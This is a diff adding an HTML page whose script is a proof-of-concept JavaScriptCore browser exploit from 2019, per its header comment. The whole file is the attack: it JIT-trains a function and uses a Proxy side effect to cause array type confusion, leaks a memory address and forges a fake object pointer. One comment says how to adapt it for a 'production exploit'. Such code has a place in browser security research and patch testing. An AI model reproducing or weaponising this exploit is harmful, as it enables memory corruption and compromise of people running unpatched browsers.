@@ -1,0 +1,48 @@
+<script>
+/*
+
+JSC nday found by accident, no idea what commit fixed this or when this got fixed but it appears it's a recent one
+
+~qwertyoruiop 2019
+
+*/
+
+
+let s = new Date(); 
+let confuse = new Array(13.37,13.37); 
+s[0] = 1;
+let hack = 0;
+Date.prototype.__proto__ = new Proxy(Date.prototype.__proto__, {has: function() {
+	if (hack) {
+//		alert("side effect");
+		confuse[1] = {};
+	}
+}}); // this doesn't trigger type conversion of |s| into SlowPutArrayStorage
+
+function victim(oj,f64,u32,doubleArray) {
+	doubleArray[0];
+	let r = 5 in oj;
+	f64[0] = f64[1] = doubleArray[1];
+	u32[2] = 0x41414141;
+	u32[3] = 0;
+	// u32[2] += 0x18; < you'd use this for an actual production exploit in order to get a fake object rather than using 0x41414141
+	doubleArray[1] = f64[1];
+	return r;
+}
+
+let u32 = new Uint32Array(4);
+let f64 = new Float64Array(u32.buffer); 
+
+for(let i=0; i<50000; i++) victim(s,f64,u32,confuse); // JIT compile
+setTimeout(function(){
+	hack = 1;
+	victim(s,f64,u32,confuse);
+	if (u32[1] === 0x7ff80000) {
+		alert("failed");
+		return;
+	}
+	alert("infoleak: " + f64[0] + " (hex: 0x" + (u32[0]+u32[1]*0x100000000).toString(16) + ")");
+	confuse[1][0];
+},50);
+</script>
+
